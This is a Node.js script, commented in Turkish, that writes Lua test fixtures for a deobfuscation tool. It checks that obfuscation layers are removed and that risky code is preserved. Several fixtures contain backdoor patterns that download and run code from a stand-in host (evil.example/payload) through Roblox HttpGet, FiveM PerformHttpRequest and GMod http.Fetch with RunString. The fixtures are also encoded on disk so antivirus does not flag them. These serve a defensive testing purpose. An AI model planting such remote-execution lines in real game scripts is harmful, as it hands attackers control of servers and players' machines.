// Temel teknik fixture'larını üretir: node scripts/make-fixtures.js
// Fixture'lar diske XOR + base64 (.lua.x) olarak yazılır ve yalnızca bellekte çözülür (test/fixture-codec.js): zararlı
// koda benzeyen test örnekleri (arka kapı, uzaktan yükleme) antivirüsü tetiklemesin. Şüpheli dizgeler betikte parçalı yazılır.
import { writeFileSync, mkdirSync, readdirSync, rmSync } from 'node:fs';
import { encodeFixture } from '../test/fixture-codec.js';

const dir = new URL('../test/fixtures/', import.meta.url);
mkdirSync(dir, { recursive: true });
for (const f of readdirSync(dir)) if (f.endsWith('.x')) rmSync(new URL(f, dir));

const URL_ = ['https://evil.', 'example/', 'payload'].join('');
const bytes = (s) => [...Buffer.from(s)].join(', ');
const dec = (s) => [...Buffer.from(s)].map((x) => `\\${x}`).join('');
const fx = {};

fx['loadstring-plain'] = `-- EXPECT: print("hi")
-- GONE: loadstring
loadstring("print('hi')")()
`;

fx['decimal-escapes'] = `-- EXPECT: print("kacis")
-- GONE: loadstring
loadstring("${dec("print('kacis')")}")()
`;

fx['char-decoder'] = `-- EXPECT: print("char")
-- GONE: string.char
-- GONE: loadstring
local k = { ${bytes("print('char')")} }
local s = ''
for i = 1, #k do
  s = s .. string.char(k[i])
end
loadstring(s)()
`;

fx['alias'] = `-- EXPECT: print("alias")
-- GONE: loadstring
local L = loadstring
local C = string.char
L(C(${bytes("print('alias')")}))()
`;

fx['nested-layers'] = `-- EXPECT: print("derin")
-- GONE: loadstring
loadstring("loadstring(\\"${dec("print('derin')")}\\")()")()
`;

fx['fold-char'] = `-- EXPECT: print("Hi")
-- GONE: string.char
print(string.char(72, 105))
`;

fx['dead-branch'] = `-- EXPECT: print("canli")
-- GONE: olu
if false then
  print('olu')
end
while nil do
  print('olu')
end
print('canli')
`;

fx['iife'] = `-- EXPECT: print("ic")
-- GONE: function
(function()
  print('ic')
end)()
`;

fx['load-54'] = `-- EXPECT: print(
-- GONE: load(
local x = load("return 7 // 2")()
print(x)
`;

// ---- güvenlik: dış girdiye bağlı kod silinmemeli
fx['input-keep'] = `-- KEEP: os.getenv
-- KEEP: loadstring
local c = os.getenv('PEEL_CMD') or 'y = 2'
loadstring(c)()
print('bitti')
`;

fx['roblox-remote-keep'] = `-- KEEP: HttpGet
-- KEEP: loadstring
loadstring(game:HttpGet('${URL_}'))()
print('yuklendi')
`;

fx['fivem-backdoor-keep'] = `-- KEEP: PerformHttpRequest
-- KEEP: load(
-- EXPECT: print("fivem")
local function run(e, d)
  if d then load(d)() end
end
PerformHttpRequest('${URL_}', run, 'GET')
loadstring("${dec("print('fivem')")}")()
`;

fx['fivem-layered'] = `-- KEEP: PerformHttpRequest
-- GONE: string.char
local s = ''
for _, b in ipairs({ ${bytes(`PerformHttpRequest('${URL_}', function(e, d) end, 'POST', 'x')`)} }) do
  s = s .. string.char(b)
end
loadstring(s)()
`;

fx['gmod-keep'] = `-- KEEP: http.Fetch
-- KEEP: RunString
http.Fetch('${URL_}', function(body) RunString(body) end)
hook.Add('Think', 'x', function() end)
`;

fx['side-effects-keep'] = `-- KEEP: os.execute
-- KEEP: io.open
-- EXPECT: print("yan")
local f = io.open('out.txt', 'w')
if f then f:write('x') f:close() end
os.execute('echo x')
loadstring("print('yan')")()
`;

fx['shebang'] = `#!/usr/bin/env lua
-- EXPECT: print("sb")
-- GONE: loadstring
loadstring("print('sb')")()
`;

for (const [name, src] of Object.entries(fx)) writeFileSync(new URL(`${name}.lua.x`, dir), encodeFixture(Buffer.from(src)));
console.log(`${Object.keys(fx).length} fixture yazıldı`);
